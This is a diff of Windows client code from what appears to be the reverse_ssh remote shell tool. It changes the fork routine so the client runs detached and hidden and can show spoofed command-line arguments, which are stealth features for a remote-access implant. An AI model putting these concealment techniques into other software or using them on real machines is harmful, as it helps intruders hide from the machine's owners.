@@ -6,11 +6,11 @@ import (
 	"fmt"
 	"log"
 	"os"
-	"os/exec"
 	"syscall"
 	"time"
 
 	"github.com/NHAS/reverse_ssh/internal/client"
+	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/svc"
 	"golang.org/x/sys/windows/svc/debug"
 	"golang.org/x/sys/windows/svc/eventlog"
@@ -18,7 +18,7 @@ import (
 
 var elog debug.Log
 
-func Fork(destination, fingerprint, proxyaddress string) error {
+func Fork(destination, fingerprint, proxyaddress string, pretendArgv ...string) error {
 
 	inService, err := svc.IsWindowsService()
 	if err != nil {
@@ -34,16 +34,15 @@ func Fork(destination, fingerprint, proxyaddress string) error {
 		procAttachConsole := modkernel32.NewProc("FreeConsole")
 		syscall.Syscall(procAttachConsole.Addr(), 0, 0, 0, 0)
 
-		path, _ := os.Executable()
-
-		cmd := exec.Command(path, append([]string{"--foreground"}, os.Args[1:]...)...)
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		err = cmd.Start()
-
-		if cmd.Process != nil {
-			cmd.Process.Release()
+		path, err := os.Executable()
+		if err != nil {
+			return err
 		}
-		return nil
+
+		return fork(path, &syscall.SysProcAttr{
+			HideWindow:    true,
+			CreationFlags: windows.CREATE_NEW_PROCESS_GROUP | windows.DETACHED_PROCESS,
+		}, pretendArgv...)
 	}
 
 	runService("rssh", destination, fingerprint, proxyaddress)
